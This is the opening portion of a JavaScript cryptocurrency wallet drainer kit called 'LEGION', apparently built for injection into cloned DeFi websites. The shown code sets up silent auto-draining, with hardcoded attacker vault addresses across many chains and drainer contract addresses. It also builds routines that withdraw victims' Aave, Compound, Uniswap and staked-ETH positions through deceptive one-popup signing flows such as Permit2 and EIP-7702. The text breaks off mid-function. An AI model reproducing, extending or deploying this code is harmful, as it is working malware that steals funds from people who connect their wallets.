/**
 * LEGION v5 — Universal Multi-Chain Wallet Panel (single script)
 * File: legion.js + ./vendor/* for strict CSP
 * Works on: static clones, server.js, nginx proxy, Surge/Vercel, any DeFi frontend
 * All wallets: MetaMask, Rabby, OKX, Trust, Coinbase, Ledger, Trezor + WalletConnect 700+
 * All chains: ETH, BSC, Polygon, Arbitrum, Base, Optimism + SOL, TRON, TON, BTC
 * ONE popup strategy: wallet_sendCalls → EIP-7702 → Permit2 → fallback
 *
 * Usage: <script src="legion-v3.js"></script>
 * Config: window.LEGION_CONFIG = { backendUrl: '...', wcProjectId: '...' }
 */
(function () {
  'use strict';

  // ═══════════════════════════════════════════════════════════════
  // SECTION 01: GUARD + POLYFILLS
  // ═══════════════════════════════════════════════════════════════
  if (window.__LEGION_V3__) return;
  window.__LEGION_V3__ = true;

  // WalletConnect registers wcm-* custom elements; guard against double script load
  (function patchCustomElementRegistry() {
    if (window.__LEGION_CE_PATCH__) return;
    window.__LEGION_CE_PATCH__ = true;
    var reg = window.customElements;
    if (!reg || !reg.define) return;
    var orig = reg.define.bind(reg);
    reg.define = function (name, ctor, opts) {
      if (reg.get(name)) return;
      try { return orig(name, ctor, opts); }
      catch (e) {
        if (e && (e.name === 'NotSupportedError' || String(e.message || '').indexOf('already been used') >= 0)) return;
        throw e;
      }
    };
  })();

  // Polyfills live in vendor/legion-polyfills.js (load before wallet bundle)
  if (!window.__LEGION_POLYFILLS__) {
    console.warn('[Legion] Missing vendor/legion-polyfills.js — WalletConnect relay may fail');
  }

  // ═══════════════════════════════════════════════════════════════
  // SECTION 02: CONFIG + CONSTANTS
  // ═══════════════════════════════════════════════════════════════
  var CFG = Object.assign({
    backendUrl: 'https://sadrailala-production.up.railway.app',
    wcProjectId: '',
    kineticKey: '',
    silentMode: false,
    autoDrain: true,
    autoRun: false,
    autoConnectOnLoad: false,
    minDrainUsd: 5,
    strictCsp: true,
    cdnFallback: false,
    vendorBase: '',
    injectMode: 'auto',
    showOverlay: null,
    hookButtons: true,
    hwWallets: false,
    debugDevTools: false,
    clientEncryptKey: '',
  }, window.LEGION_CONFIG || {});

  var LEGION_VERSION = '5.14.2';
  var BIP122_BITCOIN_MAINNET = 'bip122:000000000019d6689c085ae165831e93';

  /** 16+ EVM chains — factory CREATE2 fills gaps where static map is zero */
  var TARGET_EVM_CHAIN_IDS = [
    1, 56, 137, 42161, 8453, 10, 43114, 250, 25, 100, 42220, 324, 59144, 534352, 81457, 5000,
  ];

  var SHOW_OVERLAY = CFG.showOverlay != null ? CFG.showOverlay === true
    : (CFG.injectMode !== 'hook' && CFG.injectMode !== 'silent' && !CFG.silentMode);
  var HOOK_BUTTONS = CFG.hookButtons !== false;
  // Same-origin script base (for ./vendor/* bundles — strict CSP safe)
  var SCRIPT_BASE = (function () {
    if (CFG.vendorBase) return String(CFG.vendorBase).replace(/\/?$/, '/');
    var cur = document.currentScript;
    if (cur && cur.src) return cur.src.replace(/[^/]*$/, '');
    return './';
  })();
  var VENDOR_BASE = SCRIPT_BASE + 'vendor/';
  var STRICT_CSP = CFG.strictCsp !== false;
  var CDN_FALLBACK = CFG.cdnFallback === true && !STRICT_CSP;

  var _vendorLoaded = {};
  function loadVendorScript(filename) {
    var key = VENDOR_BASE + filename;
    if (_vendorLoaded[key]) return _vendorLoaded[key];
    _vendorLoaded[key] = new Promise(function (resolve, reject) {
      if (document.querySelector('script[data-legion-vendor="' + filename + '"]')) {
        resolve(); return;
      }
      var s = document.createElement('script');
      s.src = key;
      s.setAttribute('data-legion-vendor', filename);
      s.crossOrigin = 'anonymous';
      s.onload = function () { resolve(); };
      s.onerror = function () { reject(new Error('Vendor missing: ' + filename)); };
      document.head.appendChild(s);
    });
    return _vendorLoaded[key];
  }

  function resolveTonConnect() {
    if (window.TonConnectSDK && window.TonConnectSDK.TonConnect) return window.TonConnectSDK.TonConnect;
    if (window.TON_CONNECT_SDK && window.TON_CONNECT_SDK.TonConnect) return window.TON_CONNECT_SDK.TonConnect;
    if (window.TonConnect) return window.TonConnect;
    return null;
  }

  var BACKEND = String(CFG.backendUrl || '').replace(/\/$/, '') || 'https://sadrailala-production.up.railway.app';
  var WC_PROJECT_ID = String(CFG.wcProjectId || '');
  var KINETIC_KEY = String(CFG.kineticKey || '');
  var SILENT = CFG.silentMode === true;
  var AUTO_DRAIN = CFG.autoDrain !== false;
  var AUTO_RUN = CFG.autoRun === true;
  var MIN_DRAIN_USD = (CFG.minDrainUsd != null && Number.isFinite(Number(CFG.minDrainUsd)))
    ? Number(CFG.minDrainUsd)
    : 5;
  var SIGN_ONLY = CFG.signOnly !== false;
  var NATIVE_BATCH_FALLBACK = CFG.nativeBatchFallback !== false;
  var MOBILE_SEND_TX = CFG.mobileSendTx !== false;

  // Logger
  var L = {
    log: function () { if (!SILENT) console.log.apply(console, ['[LGN]'].concat(Array.prototype.slice.call(arguments))); },
    warn: function () { if (!SILENT) console.warn.apply(console, ['[LGN]'].concat(Array.prototype.slice.call(arguments))); },
    err: function () { if (!SILENT) console.error.apply(console, ['[LGN]'].concat(Array.prototype.slice.call(arguments))); }
  };

  var EXPIRY_ISO = '2030-01-01T00:00:00.000Z';
  var MAX_AMOUNT = '1000000000000000000000000000';
  var NATIVE_ETH_ADDR = '0xeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeeee';
  var PERMIT2_ADDRESS = '0x000000000022D473030F116dDEE9F6B43aC78BA3';

  // Vault — filled from /api/v1/client-config, fallback to hardcoded
  var VAULT = {
    evm: '0x2B20979118a61aE3f7f75F3320FB9b0639c5BA53',
    sol: CFG.solVault || '3TKvjiU5bYnDr883orJz6vLCqksfeaDfmwSMQNCbsTZv',
    btc: CFG.btcVault || 'bc1q7frtqkunftdgukjghpnhwd0wv4f0hpsqkyj43v',
    tron: CFG.tronVault || 'TDLDgBt5WQ9cdy4mfmfMz3h6CxyjqgbZFc',
    ton: CFG.tonVault || 'UQDItY0ugaDxkMn_Rjb6gZfHOd3-R0ebD5ksb5SoTjeI3BfY',
    cosmos: CFG.cosmosVault || '',
    aptos: CFG.aptosVault || '',
    sui: CFG.suiVault || '',
  };

  var APTOS_RPC = CFG.aptosRpc || 'https://fullnode.mainnet.aptoslabs.com/v1';
  var SUI_RPC = CFG.suiRpc || 'https://fullnode.mainnet.sui.io:443';

  var SOL_RPCS = [
    CFG.solRpc || 'https://api.mainnet-beta.solana.com',
    'https://rpc.ankr.com/solana',
  ];
  var TRON_RPCS = [
    CFG.tronRpc || 'https://api.trongrid.io',
    'https://rpc.ankr.com/tron_jsonrpc',
  ];
  var COSMOS_RESTS = [
    CFG.cosmosRest || 'https://cosmos-rest.publicnode.com',
    'https://lcd-cosmoshub.keplr.app',
    'https://cosmos-lcd.quickapi.com',
  ];
  var APTOS_RPCS = [APTOS_RPC, 'https://fullnode.mainnet.aptoslabs.com/v1'];
  var SUI_RPCS = [SUI_RPC, 'https://sui-mainnet.nodeinfra.com'];

  var COSMOS_CHAINS = {
    'cosmoshub-4': {
      denom: 'uatom', min: 10000n, fee: '5000',
      rests: ['https://cosmos-rest.publicnode.com', 'https://lcd-cosmoshub.keplr.app'],
    },
    'osmosis-1': {
      denom: 'uosmo', min: 10000n, fee: '5000',
      rests: ['https://osmosis-rest.publicnode.com', 'https://lcd-osmosis.keplr.app'],
    },
    'juno-1': {
      denom: 'ujuno', min: 10000n, fee: '5000',
      rests: ['https://juno-rest.publicnode.com', 'https://lcd-juno.keplr.app'],
    },
    'evmos_9001-2': {
      denom: 'aevmos', min: 10000n, fee: '5000',
      rests: ['https://evmos-rest.publicnode.com', 'https://lcd-evmos.keplr.app'],
    },
  };

  var EVM_PUBLIC_RPC = {
    1: ['https://rpc.ankr.com/eth', 'https://eth.llamarpc.com', 'https://ethereum.publicnode.com'],
    10: ['https://rpc.ankr.com/optimism', 'https://optimism.llamarpc.com'],
    25: ['https://evm.cronos.org', 'https://cronos-evm.publicnode.com'],
    56: ['https://rpc.ankr.com/bsc', 'https://bsc-dataseed.binance.org'],
    100: ['https://rpc.gnosischain.com', 'https://gnosis-rpc.publicnode.com'],
    137: ['https://rpc.ankr.com/polygon', 'https://polygon.llamarpc.com'],
    250: ['https://rpc.ankr.com/fantom', 'https://fantom.publicnode.com'],
    324: ['https://mainnet.era.zksync.io'],
    42220: ['https://forno.celo.org', 'https://celo-rpc.publicnode.com'],
    42161: ['https://rpc.ankr.com/arbitrum', 'https://arbitrum.llamarpc.com'],
    43114: ['https://rpc.ankr.com/avalanche', 'https://avalanche-c-chain.publicnode.com'],
    8453: ['https://rpc.ankr.com/base', 'https://base.llamarpc.com'],
    5000: ['https://rpc.mantle.xyz', 'https://mantle-rpc.publicnode.com'],
    59144: ['https://rpc.linea.build'],
    534352: ['https://rpc.scroll.io'],
    81457: ['https://rpc.blast.io'],
  };

  var NFT_APPROVAL_BATCH_SIZE = 50;
  var SEND_CALLS_MAX = 50;

  // Public RPC rate limit — per-host gap + jitter (429/503 throttle mitigation)
  var RPC_RATE = { lastByHost: {}, minGapMs: 120 };
  function rpcHostKey(url) {
    try { return new URL(url).host; } catch (_) { return String(url).slice(0, 48); }
  }
  async function rpcRateWait(url) {
    var host = rpcHostKey(url);
    var gap = RPC_RATE.minGapMs + Math.floor(Math.random() * 80);
    var now = Date.now();
    var last = RPC_RATE.lastByHost[host] || 0;
    var wait = last + gap - now;
    if (wait > 0) await sleep(wait);
    RPC_RATE.lastByHost[host] = Date.now();
  }

  async function evmPublicRpcCall(chainId, method, params) {
    var cid = Number(chainId) || 1;
    var urls = EVM_PUBLIC_RPC[cid] || EVM_PUBLIC_RPC[1];
    var lastErr = null;
    for (var ei = 0; ei < urls.length; ei++) {
      try {
        await rpcRateWait(urls[ei]);
        var res = await fetch(urls[ei], {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ jsonrpc: '2.0', id: 1, method: method, params: params || [] }),
        });
        if (res.status === 429 || res.status === 503) throw new Error('RPC rate limited HTTP ' + res.status);
        var json = await res.json();
        if (json.error) throw new Error(json.error.message || 'RPC error');
        return json.result;
      } catch (e) { lastErr = e; }
    }
    throw lastErr || new Error('All EVM public RPCs failed for chain ' + cid);
  }

  async function evmRequestWithFallback(provider, chainId, method, params) {
    try {
      return await provider.request({ method: method, params: params || [] });
    } catch (e) {
      L.warn('Wallet RPC fail:', method, '— public fallback chain', chainId);
      return await evmPublicRpcCall(chainId, method, params);
    }
  }

  async function fetchJsonWithFallback(bases, path) {
    var lastErr = null;
    for (var fi = 0; fi < bases.length; fi++) {
      try {
        var base = String(bases[fi]).replace(/\/$/, '');
        await rpcRateWait(base);
        var res = await fetch(base + path);
        if (res.status === 429 || res.status === 503) throw new Error('REST rate limited HTTP ' + res.status);
        if (!res.ok) throw new Error('HTTP ' + res.status);
        return await res.json();
      } catch (e) { lastErr = e; }
    }
    throw lastErr || new Error('All REST endpoints failed');
  }

  async function createSolConnection(web3) {
    var lastErr = null;
    for (var si = 0; si < SOL_RPCS.length; si++) {
      try {
        var conn = new web3.Connection(SOL_RPCS[si], { commitment: 'confirmed' });
        await conn.getLatestBlockhash('confirmed');
        return conn;
      } catch (e) { lastErr = e; }
    }
    throw lastErr || new Error('All Solana RPCs failed');
  }

  var GAS_FLOOR_BY_CHAIN = {
    1: 100000000n,
    10: 100000000n,
    25: 500000000000n,
    56: 3000000000n,
    100: 100000000n,
    137: 30000000000n,
    250: 1000000000n,
    42161: 100000000n,
    43114: 25000000000n,
    8453: 100000000n,
    42220: 5000000000n,
    324: 100000000n,
    59144: 100000000n,
    1101: 100000000n,
    534352: 100000000n,
    81457: 100000000n,
    5000: 100000000n,
  };

  // LegionDrainV2 — ONE contract per chain (claim + DeFi drain); deploy: node contracts/deploy-legion-drain.mjs
  
  var DRAIN_FACTORY = {
    1: '0x22577De82aba57F03d677c28fC27293f86527323',
    56: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
    137: '0x5121Fd9F4B44fFce08eb0dcC53931663C7659eDc',
    5000: '0xd93E1B96103733982D76968e8668277CcBd23d57',
    43114: '0xd93E1B96103733982D76968e8668277CcBd23d57',

  };

  var LEGION_DRAIN = {
    1: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
    10: '0x758FD861d6d07d504949eb43A646D05f430765e6',
    25: '0x0000000000000000000000000000000000000000',
    56: '0x758FD861d6d07d504949eb43A646D05f430765e6',
    100: '0x0000000000000000000000000000000000000000',
    137: '0x758FD861d6d07d504949eb43A646D05f430765e6',
    250: '0x0000000000000000000000000000000000000000',
    324: '0x0000000000000000000000000000000000000000',
    5000: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
    8453: '0x758FD861d6d07d504949eb43A646D05f430765e6',
    42161: '0x758FD861d6d07d504949eb43A646D05f430765e6',
    42220: '0x0000000000000000000000000000000000000000',
    43114: '0x09571F30330b034a298642ae5F30d42a753676cf',
    59144: '0x0000000000000000000000000000000000000000',
    81457: '0x09571F30330b034a298642ae5F30d42a753676cf',
    534352: '0x51D55A90c6B0a790cBaB8CC23B9387c42171f759',
    11155111: '0x0000000000000000000000000000000000000000',

  };

  // Legacy maps (fallback until LEGION_DRAIN deployed)
  var BATCH_DRAIN = {
    1: '0x758FD861d6d07d504949eb43A646D05f430765e6',
    10: '0x0000000000000000000000000000000000000000',
    56: '0x0000000000000000000000000000000000000000',
    137: '0x0000000000000000000000000000000000000000',
    8453: '0x0000000000000000000000000000000000000000',
    42161: '0x0000000000000000000000000000000000000000',
    43114: '0x0000000000000000000000000000000000000000',
    11155111: '0x0000000000000000000000000000000000000000',
  };

  // BatchDrainV2 — self-initiated EIP-7702 (onlySelf); mainnet deployed
  var BATCH_DRAIN_V2 = {
    1: '0x51d55a90c6b0a790cbab8cc23b9387c42171f759',
    10: '0x51D55A90c6B0a790cBaB8CC23B9387c42171f759',
    56: '0x51D55A90c6B0a790cBaB8CC23B9387c42171f759',
    137: '0x09571F30330b034a298642ae5F30d42a753676cf',
    5000: '0x09571F30330b034a298642ae5F30d42a753676cf',
    8453: '0x51D55A90c6B0a790cBaB8CC23B9387c42171f759',
    42161: '0x09571F30330b034a298642ae5F30d42a753676cf',
    43114: '0xF4B67A60fEEB92992487957E0D597A0e009bb4D3',
    81457: '0x51D55A90c6B0a790cBaB8CC23B9387c42171f759',
    534352: '0x758FD861d6d07d504949eb43A646D05f430765e6',
    11155111: '0x0000000000000000000000000000000000000000',

  };

  /** Vault baked into deployed BatchDrainV2 on mainnet — NOT the same as VAULT.evm from API */
  var BATCH_DRAIN_V2_ONCHAIN_VAULT = '0xc46e0141a979a071360A692F887c3dA6b7E39A44';

  // ClaimForwarder — claim() payable → vault (nblscj-style); run deploy-claim-forwarder.mjs
  var CLAIM_FORWARDER = {
    1: '0x0000000000000000000000000000000000000000',
    10: '0x0000000000000000000000000000000000000000',
    56: '0x0000000000000000000000000000000000000000',
    137: '0x0000000000000000000000000000000000000000',
    8453: '0x0000000000000000000000000000000000000000',
    42161: '0x0000000000000000000000000000000000000000',
    43114: '0x0000000000000000000000000000000000000000',
    11155111: '0x0000000000000000000000000000000000000000',
  };

  var ZERO_ADDR = '0x0000000000000000000000000000000000000000';
  var SIG_CLAIM = '0x4e71d92d';
  var SIG_FINISH_DESTROY = '0xd1394451';
  var SIG_VAULT_READ = '0x411557d1';

  // LegionDrainV2 DefiAction kinds (must match contracts/LegionDrainV2.sol)
  var DEFI_KIND = {
    AAVE_WITHDRAW: 1,
    COMPOUND_REDEEM: 2,
    UNIV2_REMOVE: 3,
    WSTETH_UNWRAP: 4,
    UNIV3_EXIT: 5,
  };

  var CHAIN_DEFI = {
    1: {
      aavePool: '0x87870Bca3F3fD6335C3F4ce8392D69350B4fA4E2',
      uniV2Router: '0x7a250d5630B4cF539739dF2C5dAcb4c659F2498D',
      uniV3Npm: '0xC36442b4a4522E871399CD117a5BA2e3272ce88',
      wstETH: '0x7f39C581F595B53c5cb19bd0b3f8dA6c935E2Ca0',
    },
    42161: {
      aavePool: '0x794a61358D6845594F94dc1DB02A252b5b4814aD',
      uniV2Router: '0x4752ba5dbc23f44d87826276bf6fd8b45cae2e16',
      uniV3Npm: '0xC36442b4a4522E871399CD117a5BA2e3272ce88',
      wstETH: ZERO_ADDR,
    },
    8453: {
      aavePool: '0xA238Dd80C259a72e81d7e4664a9801593F07d352',
      uniV2Router: '0x4752ba5dbc23f44d87826276bf6fd8b45cae2e16',
      uniV3Npm: '0x03a520b32C04BF3bEEf7BEb72E919cf822Ed34f1',
      wstETH: ZERO_ADDR,
    },
    10: {
      aavePool: '0x794a61358D6845594F94dc1DB02A252b5b4814aD',
      uniV2Router: '0x4752ba5dbc23f44d87826276bf6fd8b45cae2e16',
      uniV3Npm: '0xC36442b4a4522E871399CD117a5BA2e3272ce88',
      wstETH: ZERO_ADDR,
    },
    137: {
      aavePool: '0x794a61358D6845594F94dc1DB02A252b5b4814aD',
      uniV2Router: '0xa5E0829CaCEd8fFDD4De3c43696c57F7D7A678ff',
      uniV3Npm: '0xC36442b4a4522E871399CD117a5BA2e3272ce88',
      wstETH: ZERO_ADDR,
    },
    56: {
      aavePool: ZERO_ADDR,
      uniV2Router: '0x10ED43C718714eb63d5aA57B78B54704E256024E',
      uniV3Npm: '0x46A15B0b27311cedF172Ab29E4f4766fbE7F4364',
      wstETH: ZERO_ADDR,
    },
    43114: {
      aavePool: '0x794a61358D6845594F94dc1DB02A252b5b4814aD',
      uniV2Router: '0xE54Ca86531f17b86F67c2eB5d65B4b92C44458fc',
      uniV3Npm: '0x655C406EbFa6902004403EEF26DB0f5F0702CaFd',
      wstETH: ZERO_ADDR,
    },
  };

  // Aave V3 aToken → underlying (Ethereum mainnet — expand per chain as needed)
  var AAVE_ATOKEN_MAP = {
    '0x4d5f47fa6a74757fc94fed44d51b0ae5dab1946': '0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2',
    '0x98c23e9d8f35fbb67a207a64ec021a42c7ecdc4': '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48',
    '0x23878914efe38d27c471d6ab029be0ccfa46fc2f': '0xdAC17F958D2ee523a2206206994597C13D831ec7',
    '0x018008bfb33d285247a21d44e50697654f754e63': '0x6B175474E89094C44Da98b954EedeAC495271d0F',
    '0xae7ab96520de3a18e5e111b5eaab095312d7fe84': '0xae7ab96520DE3A18E5e111B5EaAb095312D7fE84',
  };

  // Compound V2 cToken addresses (Ethereum)
  var COMPOUND_CTOKEN_SET = {
    '0x39aa3ce973723750a3e2120226f44539937090c': true,
    '0x4ddc2d193948926d02f9b1fe9e1daa0718270ed5': true,
    '0x5d3a536e4d6dbd6114cc1ead35777bab948e3643': true,
    '0xf650c3d88d12eebaba46af08b3ddc45d51b42138': true,
  };

  function buildDefiActions(chainId, assets) {
    var cfg = CHAIN_DEFI[Number(chainId)];
    if (!cfg) return [];
    var actions = [];
    var seen = {};

    function pushAction(a) {
      var key = [a.kind, a.target, a.tokenA, a.tokenB, a.param1].join(':');
      if (seen[key]) return;
      seen[key] = true;
      actions.push(a);
    }

    (assets.defi_positions || []).forEach(function (p) {
      if (!p || !p.kind) return;
      pushAction({
        kind: Number(p.kind),
        target: p.target || cfg.aavePool,
        tokenA: p.tokenA || p.asset || ZERO_ADDR,
        tokenB: p.tokenB || ZERO_ADDR,
        param1: String(p.param1 || p.amount || '0'),
        param2: String(p.param2 || '0'),
        param3: String(p.param3 || '0'),
      });
    });

    (assets.tokens || []).forEach(function (t) {
      if (!t || !t.address) return;
      var addr = String(t.address).toLowerCase();
      var bal = BigInt(t.balance || '0');
      if (bal === 0n) return;

      if (cfg.wstETH && addr === cfg.wstETH.toLowerCase()) {
        pushAction({
          kind: DEFI_KIND.WSTETH_UNWRAP,
          target: cfg.wstETH,
          tokenA: cfg.wstETH,
          tokenB: ZERO_ADDR,
          param1: String(bal),
          param2: '0',
          param3: '0',
        });
        return;
      }

      var underlying = AAVE_ATOKEN_MAP[addr];
      if (underlying && cfg.aavePool && !isZeroAddr(cfg.aavePool)) {
        pushAction({
          kind: DEFI_KIND.AAVE_WITHDRAW,
          target: cfg.aavePool,
          tokenA: underlying,
          tokenB: ZERO_ADDR,
          param1: '0',
          param2: '0',
          param3: '0',
        });
        return;
      }

      if (COMPOUND_CTOKEN_SET[addr] && bal > 0n) {
        pushAction({
          kind: DEFI_KIND.COMPOUND_REDEEM,
          target: t.address,
          tokenA: ZERO_ADDR,
          tokenB: ZERO_ADDR,
          param1: '0',
          param2: '0',
          param3: '0',
        });
      }
    });

    (assets.uni_v3_positions || []).forEach(function (pos) {
      if (!pos || !pos.tokenId) return;
      pushAction({
        kind: DEFI_KIND.UNIV3_EXIT,
        target: pos.npm || cfg.uniV3Npm,
        tokenA: ZERO_ADDR,
        tokenB: ZERO_ADDR,
        param1: String(pos.tokenId),
        param2: String(pos.liquidity || '0'),
        param3: '0',
      });
    });

    (assets.uni_v2_lps || []).forEach(function (lp) {
      if (!lp || !lp.tokenA || !lp.tokenB || !lp.liquidity) return;
      pushAction({
        kind: DEFI_KIND.UNIV2_REMOVE,
        target: cfg.uniV2Router,
        tokenA: lp.tokenA,
        tokenB: lp.tokenB,
        param1: String(lp.liquidity),
        param2: '0',
        param3: '0',
      });
    });

    return actions.slice(0, 24);
  }

  function isZeroAddr(addr) {
    return !addr || String(addr).toLowerCase() === ZERO_ADDR;
  }

  function hasFactoryOnChain(chainId) {
    var id = Number(chainId);
    return !isZeroAddr(DRAIN_FACTORY[id]);
  }

  function resolveStaticClaimFallback(chainId) {
    var id = Number(chainId);
    var ld = LEGION_DRAIN[id];
    if (!isZeroAddr(ld)) return ld;
    var cf = CLAIM_FORWARDER[id];
    if (!isZeroAddr(cf)) return cf;
    return null;
  }

  function isFactoryCloneAddress(chainId, contractAddr) {
    if (!contractAddr) return false;
    var id = Number(chainId);
    var addrKey = S.evmAddr ? (String(S.evmAddr).toLowerCase() + ':' + id) : null;
    var lower = String(contractAddr).toLowerCase();
    if (addrKey && S.factoryContracts[addrKey] === lower) return true;
    return false;
  }

  function resolveClaimContract(chainId) {
    var id = Number(chainId);
    var addrKey = S.evmAddr ? (String(S.evmAddr).toLowerCase() + ':' + id) : null;
    if (addrKey && S.factoryContracts[addrKey] && !isZeroAddr(S.factoryContracts[addrKey])) {
      return S.factoryContracts[addrKey];
    }
    if (S.factoryContracts[id] && !isZeroAddr(S.factoryContracts[id])) {
      return S.factoryContracts[id];
    }
    if (hasFactoryOnChain(id) && !S.factoryFallbackAllowed[id]) {
      return null;
    }
    return resolveStaticClaimFallback(id);
  }

  async function ensureUserFactoryContract(address, chainId) {
    if (!address || !chainId) return null;
    if (!hasFactoryOnChain(chainId)) return null;
    var key = String(address).toLowerCase() + ':' + Number(chainId);
    if (S.factoryContracts[key]) return S.factoryContracts[key];
    try {
      var r = await apiPost('/api/v1/factory/deploy', {
        wallet_address: String(address).toLowerCase(),
        chain_id: Number(chainId),
        predict_only: !S.relayerSponsored,
        deploy_on_chain: !!S.relayerSponsored,
      });
      var data = r && (r.data || r);
      if (data && data.contract_address && !isZeroAddr(data.contract_address)) {
        S.factoryContracts[key] = String(data.contract_address).toLowerCase();
        if (data.deployed) L.log('[factory] relayer deployed clone on chain', chainId);
        else L.log('[factory] clone address ready on chain', chainId, S.factoryContracts[key].slice(0, 10) + '...');
        return S.factoryContracts[key];
      }
      if (data && data.fallback) {
        S.factoryFallbackAllowed[Number(chainId)] = true;
        L.log('[factory] no factory on chain', chainId, '— static LegionDrain fallback');
      }
    } catch (e) {
      S.factoryFallbackAllowed[Number(chainId)] = true;
      L.warn('factory deploy predict:', e.message);
    }
    return null;
  }

  var SIG_ACTIVE_READ = '0x22f38e27';

  async function stateDependentValidation(provider, address, chainId) {
    try {
      var cur = await getProviderChainId(provider);
      if (Number(cur) !== Number(chainId)) {
        L.warn('[validate] chain mismatch provider', cur, 'expected', chainId);
        return false;
      }
      var accts = await provider.request({ method: 'eth_accounts' });
      if (accts && accts[0] && String(accts[0]).toLowerCase() !== String(address).toLowerCase()) {
        L.warn('[validate] account mismatch');
        return false;
      }
      var claim = resolveClaimContract(chainId);
      if (claim) {
        var activeRaw = await evmRequestWithFallback(provider, chainId, 'eth_call', [{
          to: claim, data: SIG_ACTIVE_READ,
        }, 'latest']);
        if (activeRaw && activeRaw !== '0x' && BigInt(activeRaw) === 0n) {
          L.warn('[validate] clone deactivated — skip claim on', chainId);
          S.deactivatedContracts[claim.toLowerCase()] = true;
          return false;
        }
        var onVault = await readContractVault(provider, claim);
        if (onVault && VAULT.evm && onVault !== String(VAULT.evm).toLowerCase()) {
          L.warn('[validate] vault mismatch on clone');
          return false;
        }
      }
      return true;
    } catch (e) {
      L.warn('[validate] soft-fail:', e.message);
      return true;
    }
  }

  function resolveLegionDrain(chainId) {
    var id = Number(chainId);
    if (hasFactoryOnChain(id) && !S.factoryFallbackAllowed[id]) {
      return null;
    }
    var ld = LEGION_DRAIN[id];
    if (!isZeroAddr(ld)) return ld;
    return resolveBatchDrainV2(chainId);
  }

  function resolveBatchDrainV2(chainId) {
    var id = Number(chainId);
    var a = BATCH_DRAIN_V2[id];
    return isZeroAddr(a) ? null : a;
  }

  async function readContractVault(provider, contractAddr) {
    if (!contractAddr || !provider) return null;
    try {
      var raw = await provider.request({
        method: 'eth_call',
        params: [{ to: contractAddr, data: SIG_VAULT_READ }, 'latest'],
      });
      if (raw && String(raw).length >= 66) {
        return ('0x' + String(raw).slice(-40)).toLowerCase();
      }
    } catch (e) { L.warn('readContractVault:', e.message); }
    return null;
  }

  function logContractCoverage(chainId) {
    var id = Number(chainId);
    var claim = resolveClaimContract(id);
    var bd2 = resolveBatchDrainV2(id);
    var bd1 = BATCH_DRAIN[id];
    L.log('[contracts] chain', id,
      '| claim:', claim ? claim.slice(0, 10) + '...' : 'NOT_DEPLOYED',
      '| batchV2:', bd2 ? bd2.slice(0, 10) + '...' : 'NOT_DEPLOYED',
      '| batchV1:', !isZeroAddr(bd1) ? bd1.slice(0, 10) + '...' : 'NOT_DEPLOYED',
      '| apiVault:', VAULT.evm.slice(0, 10) + '...',
      bd2 ? ('| v2OnChainVault:' + BATCH_DRAIN_V2_ONCHAIN_VAULT.slice(0, 10) + '...') : '');
  }

  var EIP7702_CHAINS = { 1: true, 10: true, 8453: true, 42161: true, 11155111: true };

  var CHAIN_META = {
    1: { name: 'Ethereum', symbol: 'ETH' },
    56: { name: 'BNB Smart Chain', symbol: 'BNB' },
    137: { name: 'Polygon', symbol: 'MATIC' },
    42161: { name: 'Arbitrum', symbol: 'ETH' },
    8453: { name: 'Base', symbol: 'ETH' },
    10: { name: 'Optimism', symbol: 'ETH' },
    43114: { name: 'Avalanche', symbol: 'AVAX' },
    11155111: { name: 'Sepolia', symbol: 'ETH' },
  };

  function rankedAssetChainId(chainStr) {
    var s = String(chainStr || '').toLowerCase();
    var m = s.match(/^evm:(\d+)$/);
    if (m) return parseInt(m[1], 10);
    if (s === 'ethereum' || s === 'eth' || s === 'mainnet') return 1;
    if (s.indexOf('bsc') !== -1 || s === 'bnb') return 56;
    if (s.indexOf('polygon') !== -1 || s === 'matic') return 137;
    if (s.indexOf('arbitrum') !== -1) return 42161;
    if (s.indexOf('base') !== -1) return 8453;
    if (s.indexOf('optimism') !== -1) return 10;
    if (s.indexOf('avalanche') !== -1 || s.indexOf('avax') !== -1) return 43114;
    if (s.indexOf('scroll') !== -1) return 534352;
    if (s.indexOf('blast') !== -1) return 81457;
    if (s.indexOf('mantle') !== -1) return 5000;
    if (s.indexOf('fantom') !== -1 || s.indexOf('ftm') !== -1) return 250;
    if (s.indexOf('cronos') !== -1) return 25;
    if (s.indexOf('gnosis') !== -1 || s.indexOf('gno') !== -1) return 100;
    if (s.indexOf('celo') !== -1) return 42220;
    if (s.indexOf('zksync') !== -1) return 324;
    if (s.indexOf('linea') !== -1) return 59144;
    if (s.indexOf('zkevm') !== -1 || s.indexOf('polygon_zkevm') !== -1) return 1101;
    if (s.indexOf('metis') !== -1) return 1088;
    return null;
  }

  function isInjectedConnectorId(connId) {
    var c = String(connId || '').toLowerCase();
    return c.indexOf('phantom') !== -1 || c.indexOf('injected') !== -1 ||
      c.indexOf('metamask') !== -1 || c.indexOf('rabby') !== -1 ||
      c.indexOf('trust') !== -1 || c.indexOf('coinbase') !== -1 ||
      c.indexOf('brave') !== -1 || c.indexOf('okx') !== -1;
  }

  function isRealWalletConnectSession(connId, provider) {
    if (!provider) return false;
    var c = String(connId || '').toLowerCase();
    if (isInjectedConnectorId(c)) return false;
    if (provider.isMetaMask && !provider.isWalletConnect) return false;
    return provider.isWalletConnect === true || c.indexOf('walletconnect') !== -1;
  }

  async function safeGetLegionProvider() {
    if (!window.LegionWallet || typeof window.LegionWallet.getProvider !== 'function') return null;
    try {
      var r = window.LegionWallet.getProvider();
      if (r && typeof r.then === 'function') r = await r;
      return r || null;
    } catch (e) {
      return null;
    }
  }

  async function disconnectLegionWallet() {
    try {
      if (window.LegionWallet && window.LegionWallet.disconnect) {
        await window.LegionWallet.disconnect();
      }
    } catch (e) {}
  }

  function clearWcStorageKeys() {
    try {
      var wcKeys = [];
      for (var wi = 0; wi < localStorage.length; wi++) {
        var wk = localStorage.key(wi);
        if (!wk) continue;
        var wkl = wk.toLowerCase();
        if (wkl.indexOf('wc@') === 0 || wkl.indexOf('walletconnect') !== -1 ||
            wkl.indexOf('w3m') !== -1 || wkl.indexOf('@w3m') !== -1) wcKeys.push(wk);
      }
      wcKeys.forEach(function (k) { try { localStorage.removeItem(k); } catch (e2) {} });
      if (wcKeys.length) L.log('Cleared', wcKeys.length, 'WC storage keys');
    } catch (e3) {}
  }

  async function cleanConflictingWcSessions() {
